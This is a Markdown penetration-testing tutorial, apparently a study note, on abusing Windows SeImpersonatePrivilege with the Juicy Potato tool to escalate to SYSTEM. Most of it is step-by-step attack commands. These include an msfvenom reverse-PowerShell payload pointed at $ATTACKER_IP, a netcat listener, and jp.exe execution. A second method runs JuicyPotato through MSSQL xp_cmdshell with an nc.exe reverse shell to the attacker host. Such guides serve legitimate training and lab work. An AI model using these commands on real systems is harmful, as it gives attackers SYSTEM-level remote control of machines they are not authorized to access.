#### <span style="color:#FFB86C">**Tokens in Windows**</span>
Every program (process) running on Windows has a **"token"**. Think of this like an **ID card**. It shows **who is running that program** (e.g., a normal user or the SYSTEM user).
- Some programs can **use someone else’s token** to **"pretend" to be them**. This is called **Impersonation**.
- But to do that, the process needs **special rights**:
    - **SeImpersonatePrivilege** (Impersonate someone else)
    - **SeAssignPrimaryTokenPrivilege** (Start a new process with someone else’s token)

> These are powerful rights usually only given to Admins.
___

# <span style="color:#FF5555">Juicy Potato</span>

### <span style="color:#50FA7B">What is Juicy Potato?</span>
**Juicy Potato** is a Windows local privilege escalation tool that abuses the **SeImpersonatePrivilege** to gain **SYSTEM-level access** from a low-privileged user account.
You already have **a shell** (or Meterpreter session) on the **target machine**.
#### <span style="color:#FFB86C">Required Privilege:</span>
- **SeImpersonatePrivilege** **OR**
- **SeAssignPrimaryTokenPrivilege**
>  **You only need one of them to work** (usually `SeImpersonatePrivilege` is enough)

## <span style="color:#8BE9FD">Method-1 (using shell)</span>
#### <span style="color:#FFB86C">1️ Check User Privileges</span>
On the target machine, run:
```bash
whoami /priv
```
Look for this line:
```
SeImpersonatePrivilege      Enabled
```
> ✅ If it's enabled, you can continue with the Juicy Potato attack!

#### <span style="color:#FFB86C">2️ Download Juicy Potato</span>
Download the executable from:
👉 https://github.com/ohpe/juicy-potato
Rename it (for simplicity):
```bash
jp.exe
```
Copy it to the **victim machine**.
#### <span style="color:#FFB86C">3️ Create a Malicious Payload</span>
On your **attacker machine** (Kali), generate a reverse shell in `.bat` format:
```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=$ATTACKER_IP LPORT=<Your_Port> -f raw > myshell.bat
```
Replace `$ATTACKER_IP` and `<Your_Port>` with your Kali IP and chosen port.
Upload `myshell.bat` to the **victim machine**.
#### <span style="color:#FFB86C">4️ Start Netcat Listener</span>
On your Kali machine:
```bash
nc -nlvp <Your_Port>
```
#### <span style="color:#FFB86C">5️ Run Juicy Potato Exploit</span>
On the victim machine:
```bash
jp.exe -t * -p myshell.bat -l 4444
```
- `t *` = Try all available COM types
- `p myshell.bat` = The payload you want to run
- `l 4444` = Port used by the fake COM server (can be any unused port)
### <span style="color:#50FA7B">Result</span>
You should now get a **reverse shell as SYSTEM** on your Netcat listener!

## <span style="color:#8BE9FD">Method-2 (Using mssqlclient.py)</span>

1. check the privileges 
```sql
SQL> xp_cmdshell whoami
```
2. 
```sql
SQL> xp_cmdshell C:\tools\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe $ATTACKER_IP 8443 -e cmd.exe" -t *  
```
Explanation of flags:
- `-l 1337` = Random COM listener port
- `-p` = Program to run (cmd.exe)
- `-a` = Argument for cmd (Netcat reverse shell)
- `-t *` = Use both token impersonation methods (CreateProcessWithTokenW or CreateProcessAsUser)

you will have a reverse shell on your net cat listener 
